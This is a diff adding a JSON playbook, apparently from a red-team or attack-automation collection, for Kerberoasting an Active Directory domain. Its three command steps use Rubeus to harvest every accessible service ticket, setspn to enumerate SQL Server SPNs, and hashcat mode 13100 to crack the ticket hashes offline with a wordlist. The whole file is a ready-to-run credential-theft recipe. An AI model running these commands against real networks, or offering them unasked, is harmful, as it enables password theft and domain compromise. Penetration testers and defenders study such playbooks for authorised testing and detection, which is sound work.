@@ -1,0 +1,25 @@
+{
+	"name": "Service Ticket Hash Extraction",
+	"description": "Request and crack TGS tickets for SPN-linked accounts.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Ticket Request",
+			"command": "Rubeus.exe kerberoast /outfile:tgs.txt /simple",
+			"description": "Harvest all accessible service tickets."
+		},
+		{
+			"index": 2,
+			"name": "Manual SPN Target",
+			"command": "setspn -T corp -Q */sqlserver | Select-String \"CN=\"",
+			"description": "Confirm specific service SPN."
+		},
+		{
+			"index": 3,
+			"name": "Crack TGS Hashes",
+			"command": "hashcat -m 13100 tgs.txt wordlist.txt",
+			"description": "Offline password recovery."
+		}
+	]
+}
